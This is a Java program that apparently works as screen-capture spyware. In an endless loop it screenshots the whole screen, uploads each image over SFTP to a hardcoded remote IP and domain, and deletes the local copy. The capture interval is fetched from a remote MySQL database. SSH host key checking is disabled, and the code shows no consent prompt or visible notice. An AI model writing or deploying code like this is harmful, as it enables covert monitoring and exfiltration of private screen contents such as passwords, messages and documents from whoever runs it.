import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpATTRS;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import javax.imageio.ImageIO;

public class Main {

  private static final SimpleDateFormat formatter = new SimpleDateFormat("HH.mm.ss");
  private static final SimpleDateFormat formatter2 = new SimpleDateFormat("dd.MM.yyyy");
  private static final String remoteHost = "95.181.157.159";
  private static final String username = "";
  private static final String password = "";
  private static final String localFolderName = "C://MayningImagesFolder";
  private static final String folderSFTP = "/var/www/vhosts/megolox.ru/httpdocs/mayningImages/";
  private static final String CONN = "jdbc:mysql://95.181.157.159:3306/?useSSL=false&serverTimezone=UTC&characterEncoding=utf8";
  private static final String USER = "";
  private static final String PASS = "";
  private static final HashMap<Integer, String> time = new HashMap<Integer, String>();

  public static void main(String[] args) {
    for (; ; ) {
      try {
        File directory = new File(localFolderName);
        if(!directory.exists()){
          directory.mkdir();
        }
        if (directory.exists()) {
          String query = "SELECT id, text FROM ScreenShots WHERE id = 0";
          Connection conn = DriverManager.getConnection(CONN, USER, PASS);
          Statement statement = conn.createStatement();
          ResultSet rs = statement.executeQuery(query);
          while (rs.next()) {
            String id = rs.getString("id");
            String text = rs.getString("text");
            time.put(Integer.parseInt(id), text);
          }

          Robot robot = new Robot();
          BufferedImage screenShot = robot.createScreenCapture(new Rectangle(
              Toolkit.getDefaultToolkit().getScreenSize()));
          Calendar now = Calendar.getInstance();
          ImageIO.write(screenShot, "JPG", new File(localFolderName + "/" + formatter.format(now.getTime()) + ".jpg"));
          System.out.println("Сохранена картинка: " + formatter.format(now.getTime()) + ".jpg");
          ChannelSftp channelSftp = setupJsch();
          channelSftp.connect();
          String dayFormating = formatter2.format(now.getTime());
          SftpATTRS attrs = null;
          try {
            attrs = channelSftp.stat(folderSFTP + dayFormating);
          } catch (Exception ignored) {
          }
          if (attrs != null) {
          } else {
            channelSftp.mkdir(folderSFTP + dayFormating);
          }
          channelSftp.put(localFolderName + "/" + formatter.format(now.getTime()) + ".jpg", folderSFTP + dayFormating + "/" + formatter.format(now.getTime()) + ".jpg");
          channelSftp.exit();
          Files.delete(Path.of(localFolderName + "/" + formatter.format(now.getTime()) + ".jpg"));
          Thread.sleep(Long.parseLong(time.get(0)));
          time.remove(0);
        }
      } catch (Exception ex) {
        ex.printStackTrace();
      }
    }
  }

  private static ChannelSftp setupJsch() throws JSchException {
    JSch jsch = new JSch();
    jsch.setKnownHosts("/var/www/vhosts/megolox.ru/httpdocs/mayningImages/");
    Session jschSession = jsch.getSession(username, remoteHost);
    java.util.Properties config = new java.util.Properties();
    config.put("StrictHostKeyChecking", "no");
    jschSession.setConfig(config);
    jschSession.setPassword(password);
    jschSession.connect();
    return (ChannelSftp) jschSession.openChannel("sftp");
  }
}
